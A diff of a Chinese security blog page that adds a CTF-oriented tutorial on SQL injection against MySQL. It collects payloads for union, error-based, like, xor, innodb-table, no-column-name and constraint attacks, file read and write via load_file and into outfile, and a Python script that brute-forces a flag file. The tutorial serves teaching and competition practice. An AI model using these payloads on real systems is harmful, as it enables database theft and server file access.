@@ -22,7 +22,7 @@
     <meta name="description" content="还在路上">
     <meta http-equiv="Cache-control" content="no-cache">
     <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
-    <title>Xi4or0uji</title>
+    <title>SQL注入汇总 · Xi4or0uji</title>
     <style type="text/css">
     @font-face {
         font-family: 'Oswald-Regular';
@@ -203,12 +203,23 @@
 </head>
 
     
+        <body class="post-body">
+    
     
 <header class="header">
 
     <div class="read-progress"></div>
     <div class="header-sidebar-menu">&#xe775;</div>
     <!-- post页的toggle banner  -->
+    
+    <div class="banner">
+            <div class="blog-title">
+                <a href="/">Xi4or0uji&#39;s blog</a>
+            </div>
+            <div class="post-title">
+                <a href="#" class="post-name">SQL注入汇总</a>
+            </div>
+    </div>
     
     <a class="home-link" href="/">Xi4or0uji's blog</a>
 </header>
@@ -220,24 +231,74 @@
 
 
 
+
+height:50vh;
 ">
     
     <!-- 主页  -->
+    
+    
+    <!-- 404页  -->
             
     <div class="site-intro-placeholder"></div>
-    <div class="site-intro-img" style="background-image: url(/)"></div>
+    <div class="site-intro-img" style="background-image: url(/intro/post-bg.jpg)"></div>
     <div class="site-intro-meta">
         <!-- 标题  -->
         <h1 class="intro-title">
             <!-- 主页  -->
+            
+            SQL注入汇总
+            <!-- 404 -->
             
         </h1>
         <!-- 副标题 -->
         <p class="intro-subtitle">
             <!-- 主页副标题  -->
             
+            
+            <!-- 404 -->
+            
         </p>
         <!-- 文章页meta -->
+        
+            <div class="post-intros">
+                <!-- 文章页标签  -->
+                
+                    <div class="post-intro-tags">
+    
+        <a class="post-tag" href="javascript:void(0);" data-tags="SQL">SQL</a>
+    
+</div>
+                
+                
+                    <div class="post-intro-read">
+                        <span>字数统计: <span class="post-count word-count">2.7k</span>阅读时长: <span class="post-count reading-time">11 min</span></span>
+                    </div>
+                
+                <div class="post-intro-meta">
+                    <span class="post-intro-calander iconfont-archer">&#xe676;</span>
+                    <span class="post-intro-time">2019/06/25</span>
+                    
+                    <span id="busuanzi_container_page_pv" class="busuanzi-pv">
+                        <span class="iconfont-archer">&#xe602;</span>
+                        <span id="busuanzi_value_page_pv"></span>
+                    </span>
+                    
+                    <span class="shareWrapper">
+                        <span class="iconfont-archer shareIcon">&#xe71d;</span>
+                        <span class="shareText">Share</span>
+                        <ul class="shareList">
+                            <li class="iconfont-archer share-qr" data-type="qr">&#xe75b;
+                                <div class="share-qrcode"></div>
+                            </li>
+                            <li class="iconfont-archer" data-type="weibo">&#xe619;</li>
+                            <li class="iconfont-archer" data-type="qzone">&#xe62e;</li>
+                            <li class="iconfont-archer" data-type="twitter">&#xe634;</li>
+                            <li class="iconfont-archer" data-type="facebook">&#xe67a;</li>
+                        </ul>
+                    </span>
+                </div>
+            </div>
         
     </div>
 </div>
@@ -338,161 +399,70 @@
 </script>        
         <img class="loading" src="/assets/loading.svg" style="display: block; margin: 6rem auto 0 auto; width: 6rem; height: 6rem;" />
         <div class="container container-unloaded">
-            <main class="main index-page">
-    
-    
-    
-    
-    
-    
-    <article class="index-post">
-        <a class="abstract-title" href="/2019/09/11/2019-bytectf-wp/">
-            
-                <span>2019 bytectf wp</span>
-        </a>
-        <div class="abstract-content">
-            前几天打了字节跳动的CTF，我还是太菜了，挂一挂队内wp  
-WEBboring_code题目给了源码，但是很是做了很久才出来，wtcl12345678910111213141516171819202122232425262728293031323334&lt;?phpfunction is_valid_url($url) &#123;    if (filter_var($url, FILTER_VALIDATE_URL)) &#123;        if (preg_match('/data:\/\//i', $url)) &#123;            return fals...
-        </div>
-        <div class="abstract-post-meta">
-            <!-- date  -->
-            <div class="abstract-date">
-                <span class="abstract-calander iconfont-archer">&#xe676;</span><span class="abstract-time">2019/09/11</span>
-            </div>
-            <!-- tags  -->
-            
-            <div class="abstract-tags">
-    
-        <a class="post-tag" href="javascript:void(0);" data-tags="CTF">CTF</a>
-    
-</div>
-            
-        </div>
-    </article>
-    
-    
-    
-    
-    
-    
-    <article class="index-post">
-        <a class="abstract-title" href="/2019/03/01/2019安恒杯二月赛/">
-            
-                <span>2019安恒杯二月赛</span>
-        </a>
-        <div class="abstract-content">
-            WEBmy email这题进去首先是一个注册的页面，然后登录进去后要你完善信息，也就是填一个邮箱和验证码，这里有个小坑点就是，虽然我们乱填他会说我们填的信息有误，但是再次访问发现我们的信息已经完善了，也就能进行下一步了进去以后看到有个更改背景的功能，尝试一下改了图片发现会1234567body&#123;    background-image: url(./user/roujiji.jpg);    background-size: 100%,100%;    width: 100%;    height: 100%;&#125;#roujiji是注册的用户名
-所以可以猜测是将图片命名...
-        </div>
-        <div class="abstract-post-meta">
-            <!-- date  -->
-            <div class="abstract-date">
-                <span class="abstract-calander iconfont-archer">&#xe676;</span><span class="abstract-time">2019/03/01</span>
-            </div>
-            <!-- tags  -->
-            
-            <div class="abstract-tags">
-    
-        <a class="post-tag" href="javascript:void(0);" data-tags="安恒杯">安恒杯</a>
-    
-</div>
-            
-        </div>
-    </article>
-    
-    
-    
-    
-    
-    
-    <article class="index-post">
-        <a class="abstract-title" href="/2019/02/24/2019tamuctf/">
-            
-                <span>2019tamuctf</span>
-        </a>
-        <div class="abstract-content">
-            WEBNot Another SQLi Challenge最简单的sql注入题，万能密码就能拿到flag了12admin' or 1=1#flag: gigem&#123;f4rm3r5_f4rm3r5_w3'r3_4ll_r16h7&#125;
-Robots Rule他要求是谷歌的robot访问，抓包改一下
-Many Gig’ems to you!这道题很脑洞，index.html、cookies.html和cook.js里面藏有flag所以flag就是gigem{flag_in_source_and_cookies}
-Science!这道题提示了是用Flask写的，所以尝试一下fla...
-        </div>
-        <div class="abstract-post-meta">
-            <!-- date  -->
-            <div class="abstract-date">
-                <span class="abstract-calander iconfont-archer">&#xe676;</span><span class="abstract-time">2019/02/24</span>
-            </div>
-            <!-- tags  -->
-            
-            <div class="abstract-tags">
-    
-        <a class="post-tag" href="javascript:void(0);" data-tags="CTF">CTF</a>
-    
-</div>
-            
-        </div>
-    </article>
-    
-    
-    
-    
-    
-    
-    <article class="index-post">
-        <a class="abstract-title" href="/2019/02/11/2018安恒杯十一月赛/">
-            
-                <span>2018安恒杯十一月赛</span>
-        </a>
-        <div class="abstract-content">
-            web手速要快这题一进去给个登录框要你输入密码，然后在头可以看到有密码  
+            <main class="main post-page">
+    <article class="article-entry">
+        <p>最近要做一个萌新培训&amp;搭建队内的wiki，所有就有了这个东西了，尽可能将sql注入讲全，同时也记录一下奇技淫巧2333  </p>
+<h2 id="回显注入"><a href="#回显注入" class="headerlink" title="回显注入"></a>回显注入</h2><p>这种题是最友好的题了，萌新入门题，先来个对mysql数据库最初的印象好吧  </p>
+<h3 id="例题"><a href="#例题" class="headerlink" title="例题"></a>例题</h3><p><a href="http://ctf5.shiyanbar.com/423/web/?id=1" target="_blank" rel="noopener">http://ctf5.shiyanbar.com/423/web/?id=1</a><br>做题前先来一个注入点的探测好吧<br>先尝试一下最基础的<br><img src="/assets/sql/1.png" alt=""><br><img src="/assets/sql/2.png" alt=""><br><img src="/assets/sql/3.png" alt=""><br>很明显可以确定id是注入点而且后台是用单引号闭合的<br><img src="/assets/sql/4.png" alt=""><br>可以看到回显是<code>1 1=1</code>，这里我们猜测一下，如果后台过滤了空格，而且将and替换为空刚好是这样的回显的，然后空格被过滤掉以后是可以用<code>/**/</code>或者<code>(</code>去进行替换的，尝试一下验证一下我们的猜想<br><img src="/assets/sql/5.png" alt=""><br>可以看到替换了以后空格可以执行了，而且<code>and</code>也显示出来了，或许后台没有过滤<code>and</code>？先继续下一步去探测<br><img src="/assets/sql/6.png" alt=""><br>通过这个语句爆出了数据库名，接着找表名<br><img src="/assets/sql/7.png" alt=""><br>接下来找字段名因为对<code>column_name</code>和<code>information_schema.columns</code>进行了过滤，我们可以用双写绕过<br><img src="/assets/sql/8.png" alt=""><br>拿到字段名和表名最后就是读内容了<br><img src="/assets/sql/9.png" alt=""><br>这道题的绕过还是很友好的，只是一些双写的绕过和空格的绕过而已，那么接下来我们再来一个难一点的  </p>
+<h2 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h2><p>有时候，如果过滤不严但是页面没有什么回显点的时候，可以考虑一下报错注入，常见报错分为数据溢出、xpath语法错误、主键重复和一些神奇的特性  </p>
+<h3 id="数据溢出"><a href="#数据溢出" class="headerlink" title="数据溢出"></a>数据溢出</h3><p>首先就是最基础也最好懂的数据溢出，我们先看一下mysql的数据范围<br><img src="/assets/sql/10.png" alt=""><br>这里需要注意一点的就是，整数出现溢出以后会报错的情况在mysql5.5+才会有，不然是不会进行报错的，当然，我们在做溢出的时候也不用看着上面的数据范围去选择数据进行溢出，只需要用一个小的数进行按位取反就行<br><img src="/assets/sql/11.png" alt=""><br>当然这里重点是要讲利用函数进行溢出和利用，先一个个函数讲过去  </p>
+<h4 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h4><p>这个函数是用来返回e(自然对数的底)到X次方的值此函数返回e(自然对数的底)的X次方的值，但是如果超出范围是会报错的<br><img src="/assets/sql/12.png" alt=""><br>而我们知道字母的值是很小的，好像是0？没记错的话，这个时候如果取个反而且exp一下的话，肯定是会超出范围的<br><img src="/assets/sql/13.png" alt=""><br>注意一个坑点，当mysql版本&lt;=5.5.4的时候可以将报错信息显示出来，也就是会显示成<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">MariaDB [(none)]&gt; select exp(~(select user()));</span><br><span class="line">ERROR 1690 (22003): DOUBLE value is out of range in &apos;exp(~(&apos;root@localhost&apos;))&apos;</span><br><span class="line">MariaDB [(none)]&gt;</span><br></pre></td></tr></table></figure></p>
+<p>可是mysql&gt;5.5.4的时候就只报错不显示信息了，而且报错信息有长度显示，不能超过512  </p>
+<h3 id="xpath语法错误"><a href="#xpath语法错误" class="headerlink" title="xpath语法错误"></a>xpath语法错误</h3><p>在mysql中，提供了一些xml查询和修改的函数，比如<code>extractvalue</code>和<code>updatexml</code>，但是利用他的时候要符合xpath的语法，如果不符合则会将报错信息输出出来，因此如果我们在里面进行数据库查询的时候，他也会相应的爆出来<br><img src="/assets/sql/14.png" alt=""><br>至于例题，bugku有一题多次的注入，第二关就是报错注入  </p>
+<h3 id="主键重复"><a href="#主键重复" class="headerlink" title="主键重复"></a>主键重复</h3><p>这里利用了<code>count</code>和<code>group by</code>在遇到<code>rand</code>产生的重复值时报错，错误类型是<code>duplicate entry</code>，即主键重复。实际上只要是<code>count</code>，<code>rand</code>，<code>group by</code>三个连用就会造成这种报错，与位置无关。<br><img src="/assets/sql/15.png" alt=""><br>这种报错方式的本质是因为<code>floor(rand(0)*2)</code>的重复性，导致了<code>group by</code>语句的出错，<code>group by key</code>的原理是循环读取数据的每一行，将结果保存在一个临时的表中。读取每一行的<code>key</code>时，如果<code>key</code>存在于临时表时，就不更新临时表的数据，否则就插入数据。  </p>
+<h4 id="举个栗子"><a href="#举个栗子" class="headerlink" title="举个栗子"></a>举个栗子</h4><p>假设我们现在有这样一张表<br><img src="/assets/sql/16.png" alt=""><br>但是如果我们有这样一句语句<code>select count(*) from user group by username</code>，他的过程是这样的<br>先是建立一个类似这样的虚拟表<br><img src="/assets/sql/17.png" alt=""><br>然后建立过程是<br><img src="/assets/sql/18.png" alt=""><br>正常操作是不会有问题的，但是如果<code>rand(0)*2</code>，就会报错了，因为<code>rand(0)</code>是一个稳定的序列<br><img src="/assets/sql/19.png" alt=""><br>可以看到，两次随机出来的东西居然是一样的，因此取整的时候自然也一样了<br><img src="/assets/sql/20.png" alt=""><br>这个时候如果我们将刚刚的语句改成<code>select count(*) from user group by floor(rand(0)*2)</code><br>先注意一点，MySQL官方：查询的时候如果使用<code>rand()</code>的话，该值会被计算多次，在使用<code>group by</code>的时候，<code>floor(rand(0)*2)</code>会被执行一次，如果虚表不存在记录，插入虚表的时候会再被执行一次，最终会导致主键重复错误产生。<br>继续是建立一个虚拟的表<br><img src="/assets/sql/17.png" alt=""><br>先取第一条数据，执行<code>floor(rand(0)*2)</code>（第一次计算），结果是0，但是虚表没有该键值，故再进行一次计算（第二次计算），结果是1，然后插入数据<br><img src="/assets/sql/21.png" alt=""><br>取第二条数据的时候，再进行一次计算（第三次计算），结果是1，所以更新表格<br><img src="/assets/sql/22.png" alt=""><br>到了取第三条数据的时候，进行一次计算（第四次计算），结果是0，但是键值没有0，所以再一次计算（第五次计算），但是这个时候出来的结果是1，此时1已经存在在表格里了，所以就会出现主键重复了<br>还要注意一点<br><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">RAND() in a WHERE clause is re-evaluated every time the WHERE is executed. You cannot use a column with RAND() values in an ORDER BY clause, because ORDER BY would evaluate the column multiple times.</span><br></pre></td></tr></table></figure></p>
+<p>大概的意思就是：在where语句中，where每执行一次，rand()函数就会被计算一次。rand()不能作为order by的条件字段，同理也不能作为group by的条件字段。<br><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">//数据库</span><br><span class="line">select * from user where 1=1 and (select 1 from (select count(*),concat(database(),floor(rand(0)*2))x from information_schema.tables group by x)a);</span><br><span class="line">//表名</span><br><span class="line">select * from user where 1=1 and (select 1 from (select count(*),concat((select table_name from information_schema.tables where table_schema=database() limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a);</span><br><span class="line">//字段</span><br><span class="line">select * from user where 1=1 and (select 1 from (select count(*),concat((select column_name from information_schema.columns where table_name='user' limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a);</span><br><span class="line">//值</span><br><span class="line">select * from user where 1=1 and (select 1 from (select count(*),concat((select id from user limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a);</span><br></pre></td></tr></table></figure></p>
+<h3 id="神奇的特性"><a href="#神奇的特性" class="headerlink" title="神奇的特性"></a>神奇的特性</h3><p>这里写的我也不知道归去什么，就放去特性好了  </p>
+<h4 id="列名重复"><a href="#列名重复" class="headerlink" title="列名重复"></a>列名重复</h4><p>在mysql中，列名重复的时候会报错，利用这一个特性，配合上join的使用，我们也可以将字段爆出来<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select * from (select * from user a join user b)c;</span><br><span class="line">ERROR 1060 (42S21): Duplicate column name &apos;id&apos;</span><br><span class="line">mysql&gt; select * from (select * from user a join user b using(id))c;</span><br><span class="line">ERROR 1060 (42S21): Duplicate column name &apos;username&apos;</span><br></pre></td></tr></table></figure></p>
+<h4 id="几何函数"><a href="#几何函数" class="headerlink" title="几何函数"></a>几何函数</h4><p>在mysql中有一些几何函数，例如<code>geometrycollection()，multipoint()，polygon()，multipolygon()，linestring()，multilinestring()</code>等，如果我们传入的参数不是几何数据就会报错，但是mysql版本5.7及以上的时候就只报错不报信息<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select multipoint((select * from (select * from (select version())a)b));</span><br></pre></td></tr></table></figure></p>
+<h2 id="盲注"><a href="#盲注" class="headerlink" title="盲注"></a>盲注</h2><h3 id="布尔盲注"><a href="#布尔盲注" class="headerlink" title="布尔盲注"></a>布尔盲注</h3><h3 id="时间盲注"><a href="#时间盲注" class="headerlink" title="时间盲注"></a>时间盲注</h3><h3 id="报错盲注"><a href="#报错盲注" class="headerlink" title="报错盲注"></a>报错盲注</h3><h2 id="一些神奇的技巧"><a href="#一些神奇的技巧" class="headerlink" title="一些神奇的技巧"></a>一些神奇的技巧</h2><h3 id="宽字节注入"><a href="#宽字节注入" class="headerlink" title="宽字节注入"></a>宽字节注入</h3><h3 id="like注入"><a href="#like注入" class="headerlink" title="like注入"></a>like注入</h3><p>继续是之前的数据库，我们先看一下like是怎么用的<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">MariaDB [door]&gt; select * from user where username like &apos;%us%&apos;;</span><br><span class="line">+----+----------+</span><br><span class="line">| id | username |</span><br><span class="line">+----+----------+</span><br><span class="line">| 1  | user     |</span><br><span class="line">+----+----------+</span><br><span class="line">1 row in set (0.11 sec)</span><br></pre></td></tr></table></figure></p>
+<p>一般网站在进行搜索的时候，都会将要搜索的字符放进两个%中间，所以如果我们的输入的数据不是正常的数据，而是类似于万能钥匙的东西，那样就存在注入了<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">MariaDB [door]&gt; select * from user where username like &apos;%&apos; and 1=1  and &apos;%&apos;=&apos;%&apos;;</span><br><span class="line">+----+----------+</span><br><span class="line">| id | username |</span><br><span class="line">+----+----------+</span><br><span class="line">| 1  | user     |</span><br><span class="line">| 2  | admin    |</span><br><span class="line">| 3  | Ariel    |</span><br><span class="line">| 4  | glarcy   |</span><br><span class="line">| 5  | Ariel    |</span><br><span class="line">| 6  | Twings   |</span><br><span class="line">+----+----------+</span><br><span class="line">6 rows in set (0.28 sec)</span><br></pre></td></tr></table></figure></p>
+<p>记几句语句<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&apos; and 1=1  and &apos;%&apos;=&apos;</span><br><span class="line">&apos; and 1=1--&apos;</span><br><span class="line">1&apos;or(select(password)from(user)like/**/&apos;%a%&apos;)#</span><br></pre></td></tr></table></figure></p>
+<h3 id="异或注入"><a href="#异或注入" class="headerlink" title="异或注入"></a>异或注入</h3><p>用于布尔盲注的一种，同号为假异号为真<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1^(length(select database())=5)%23</span><br></pre></td></tr></table></figure></p>
+<h3 id="innodb引擎的注入"><a href="#innodb引擎的注入" class="headerlink" title="innodb引擎的注入"></a>innodb引擎的注入</h3><p>如果mysql的用户是root，mysql版本在5.6以上，information那些关键字又过滤了，可以考虑下这个注入<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select @@innodb_version;</span><br><span class="line">+------------------+</span><br><span class="line">| @@innodb_version |</span><br><span class="line">+------------------+</span><br><span class="line">| 5.6.36-82.2      |</span><br><span class="line">+------------------+</span><br><span class="line">1 row in set (0.00 sec)</span><br><span class="line">mysql&gt; select group_concat(table_name) from mysql.innodb_table_stats where database_name=database();</span><br><span class="line">+--------------------------+</span><br><span class="line">| group_concat(table_name) |</span><br><span class="line">+--------------------------+</span><br><span class="line">| exercise,feedback,user   |</span><br><span class="line">+--------------------------+</span><br><span class="line">1 row in set (0.00 sec)</span><br><span class="line">mysql&gt; select group_concat(table_name) from mysql.innodb_index_stats where database_name=database();</span><br><span class="line">+----------------------------------------------------------------------+</span><br><span class="line">| group_concat(table_name)                                             |</span><br><span class="line">+----------------------------------------------------------------------+</span><br><span class="line">| exercise,exercise,exercise,feedback,feedback,feedback,user,user,user |</span><br><span class="line">+----------------------------------------------------------------------+</span><br><span class="line">1 row in set (0.00 sec)</span><br></pre></td></tr></table></figure></p>
+<p>但是有个鸡肋的地方就是不能报字段名  </p>
+<h3 id="无列名注入"><a href="#无列名注入" class="headerlink" title="无列名注入"></a>无列名注入</h3><p>这个是在你知道了字段有多少个，而且还知道数据库名是什么但是死活爆不出字段名的时候可以用<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">MariaDB [door]&gt; select 1,2 union select * from user;</span><br><span class="line">+---+--------+</span><br><span class="line">| 1 | 2      |</span><br><span class="line">+---+--------+</span><br><span class="line">| 1 | 2      |</span><br><span class="line">| 1 | user   |</span><br><span class="line">| 2 | admin  |</span><br><span class="line">| 3 | Ariel  |</span><br><span class="line">| 4 | glarcy |</span><br><span class="line">| 5 | Ariel  |</span><br><span class="line">| 6 | Twings |</span><br><span class="line">+---+--------+</span><br><span class="line">7 rows in set (0.00 sec)</span><br><span class="line">MariaDB [door]&gt; select `2` from (select 1,2 union select * from user)a;</span><br><span class="line">+--------+</span><br><span class="line">| 2      |</span><br><span class="line">+--------+</span><br><span class="line">| 2      |</span><br><span class="line">| user   |</span><br><span class="line">| admin  |</span><br><span class="line">| Ariel  |</span><br><span class="line">| glarcy |</span><br><span class="line">| Ariel  |</span><br><span class="line">| Twings |</span><br><span class="line">+--------+</span><br><span class="line">7 rows in set (0.00 sec)</span><br></pre></td></tr></table></figure></p>
+<h3 id="约束攻击"><a href="#约束攻击" class="headerlink" title="约束攻击"></a>约束攻击</h3><p>要求mysql版本5.5以上且设置数据库为宽松模式，避免出现error<br>主要操作就是先注册一个账号为<code>admin+n个空格+1</code>，密码任意，然后登录的时候输入admin和你刚刚注册的密码<br>原来就是mysql在select的时候比较不同长度的字符串时会用空格填充然后在进行比较，而insert的时候则会截断超过长度的字符串  </p>
+<h3 id="通过SQL注入读取文件"><a href="#通过SQL注入读取文件" class="headerlink" title="通过SQL注入读取文件"></a>通过SQL注入读取文件</h3><p>这个菜鸡踩了个大坑，之前线下赛考点这个点，但是用得少，死活记不起来，暴毙……<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">MariaDB [door]&gt; select load_file(&apos;D:/1.txt&apos;);</span><br><span class="line">+-----------------------+</span><br><span class="line">| load_file(&apos;D:/1.txt&apos;) |</span><br><span class="line">+-----------------------+</span><br><span class="line">| u see me              |</span><br><span class="line">+-----------------------+</span><br></pre></td></tr></table></figure></p>
+<p>顺便拍个当时半决赛的题解<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*-coding:utf-8 -*-</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"></span><br><span class="line">url = <span class="string">"http://172.29.3.104/index.php"</span></span><br><span class="line">chars = string.ascii_letters + string.digits + <span class="string">"&#123;&#125;"</span></span><br><span class="line">flag = <span class="string">""</span></span><br><span class="line"><span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> chars:</span><br><span class="line">        payload = <span class="string">"username='or(load_file('/flag')like/**/binary/**/'"</span> + flag + x + <span class="string">"%')#"</span></span><br><span class="line">        data = &#123;</span><br><span class="line">            <span class="string">"username"</span>: payload</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> <span class="string">"login success"</span> <span class="keyword">in</span> requests.post(url, data=data).content:</span><br><span class="line">            flag += x</span><br><span class="line">            <span class="keyword">print</span> flag</span><br></pre></td></tr></table></figure></p>
+<h3 id="通过SQL注入写文件"><a href="#通过SQL注入写文件" class="headerlink" title="通过SQL注入写文件"></a>通过SQL注入写文件</h3><p>需要有写权限才行，局限很大，但是也记一下<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">MariaDB [door]&gt; select 1 into outfile &apos;D:/1.txt&apos;;</span><br><span class="line">ERROR 1086 (HY000): File &apos;D:/1.txt&apos; already exists</span><br><span class="line">MariaDB [door]&gt; select 1 into outfile &apos;D:/2.txt&apos;;</span><br><span class="line">Query OK, 1 row affected (0.00 sec)</span><br><span class="line">MariaDB [door]&gt; select load_file(&apos;D:/2.txt&apos;);</span><br><span class="line">+-----------------------+</span><br><span class="line">| load_file(&apos;D:/2.txt&apos;) |</span><br><span class="line">+-----------------------+</span><br><span class="line">| 1                     |</span><br><span class="line">+-----------------------+</span><br><span class="line">1 row in set (0.28 sec)</span><br></pre></td></tr></table></figure></p>
 
-        </div>
-        <div class="abstract-post-meta">
-            <!-- date  -->
-            <div class="abstract-date">
-                <span class="abstract-calander iconfont-archer">&#xe676;</span><span class="abstract-time">2019/02/11</span>
-            </div>
-            <!-- tags  -->
-            
-            <div class="abstract-tags">
-    
-        <a class="post-tag" href="javascript:void(0);" data-tags="安恒杯">安恒杯</a>
-    
-</div>
-            
-        </div>
     </article>
-    
-    
-    
-    
-    
-    
-    <article class="index-post">
-        <a class="abstract-title" href="/2019/02/07/安恒杯一月赛/">
-            
-                <span>2019安恒杯一月赛</span>
-        </a>
-        <div class="abstract-content">
-            webbabygo源码12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061&lt;?php@error_reporting(1);include 'flag.php';class baby&#123;    protected $skyobj;    public $aaa;    public $bbb;    function __construct()    &#123;        $this-&gt;sk...
-        </div>
-        <div class="abstract-post-meta">
-            <!-- date  -->
-            <div class="abstract-date">
-                <span class="abstract-calander iconfont-archer">&#xe676;</span><span class="abstract-time">2019/02/07</span>
-            </div>
-            <!-- tags  -->
-            
-            <div class="abstract-tags">
-    
-        <a class="post-tag" href="javascript:void(0);" data-tags="安恒杯">安恒杯</a>
-    
-</div>
-            
-        </div>
-    </article>
+    <!-- license  -->
     
     <!-- paginator  -->
+    <ul class="post-paginator">
+        <li class="next">
+            
+                <div class="nextSlogan">Next Post</div>
+                <a href="/2019/06/27/php反序列化由浅到深/" title="php反序列化由浅到深">
+                    <div class="nextTitle">php反序列化由浅到深</div>
+                </a>
+            
+        </li>
+        <li class="previous">
+            
+                <div class="prevSlogan">Previous Post</div>
+                <a href="/2019/05/27/2019强网杯wp/" title="2019强网杯wp">
+                    <div class="prevTitle">2019强网杯wp</div>
+                </a>
+            
+        </li>
+    </ul>
+    <!-- 评论插件 -->
+    <!-- 来必力City版安装代码 -->
+
+<!-- City版安装代码已完成 -->
     
+    
+    <!-- partial('_partial/comment/changyan') -->
+    <!--PC版-->
+
+
+    
+    
+
+    <!-- 评论 -->
 </main>
             <!-- profile -->
             
@@ -570,6 +540,24 @@ Science!这道题提示了是用Flask写的，所以尝试一下fla...
 </footer>
     </div>
     <!-- toc -->
+    
+    <div class="toc-wrapper" style=
+    
+
+
+
+
+
+
+
+top:50vh;
+
+    >
+        <div class="toc-catalog">
+            <span class="iconfont-archer catalog-icon">&#xe613;</span><span>CATALOG</span>
+        </div>
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#回显注入"><span class="toc-number">1.</span> <span class="toc-text">回显注入</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#例题"><span class="toc-number">1.1.</span> <span class="toc-text">例题</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#报错注入"><span class="toc-number">2.</span> <span class="toc-text">报错注入</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#数据溢出"><span class="toc-number">2.1.</span> <span class="toc-text">数据溢出</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#exp"><span class="toc-number">2.1.1.</span> <span class="toc-text">exp</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#xpath语法错误"><span class="toc-number">2.2.</span> <span class="toc-text">xpath语法错误</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#主键重复"><span class="toc-number">2.3.</span> <span class="toc-text">主键重复</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#举个栗子"><span class="toc-number">2.3.1.</span> <span class="toc-text">举个栗子</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#神奇的特性"><span class="toc-number">2.4.</span> <span 